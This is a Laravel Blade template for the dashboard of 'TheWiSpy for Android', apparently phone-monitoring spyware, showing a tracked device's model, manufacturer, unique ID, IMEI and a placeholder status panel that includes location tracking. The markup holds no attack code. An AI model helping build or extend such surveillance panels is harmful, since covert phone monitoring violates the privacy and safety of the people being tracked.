@extends('layouts.dashboard')



@section('content')

<div class="row bg-title">

                    <div class="col-lg-3 col-md-4 col-sm-4 col-xs-12">

                        <h4 class="page-title">Dashboard</h4></div>

                    

                    </div>

                    <div class="row">

                    <div class="col-md-12 col-lg-12 col-sm-12 col-xs-12">

					<div class="white-box">

                        	<h3 class="box-title">TheWiSpy for Andriod</h3>

                        

                        <div class="col-md-9">

							<div class="device-box inner-box">

								<div class="col-md-8">

									<div class="col-md-4">

										<i class="fa fa-user-circle fa-fw" aria-hidden="true"></i>

									</div>

									<div class="col-md-8">

										<h4 class="device-title">TheWiSpy For Android</h4>

										<li data-toggle="tooltip" title=""><i class="fa fa-mobile fa-fw" aria-hidden="true"></i>{{$clientlist->modal}}</li>

										<li><i class="fa fa-assistive-listening-systems fa-fw" aria-hidden="true"></i>{{$clientlist->manufacturer}}</li>

										<li><i class="fa fa-key fa-fw" aria-hidden="true"></i>{{$clientlist->uniqueid}}</li>

										<li><i class="fa fa-id-badge fa-fw" aria-hidden="true"></i> {{$clientlist->IMEI}}</li>

									</div>



								</div>



							</div>



						</div>

						<div class="col-md-3 device-info">

							<h5>Device Info</h5>

							<p class="imei-number">{{$clientlist->IMEI}}</p>

							<p><i class="fa fa-battery-three-quarters fa-fw" aria-hidden="true"></i> 92%</p>

							<p><i class="fa fa-wifi fa-fw" aria-hidden="true"></i> Mobile: On</p>

							<p><i class="fa fa-map-marker fa-fw" aria-hidden="true"></i> Location tracker: Off</p>

							<p><i class="fa fa-clock-o fa-fw" aria-hidden="true"></i> 09/01/2020</p>

						</div>

                    </div>

					</div>

                </div>

@endsection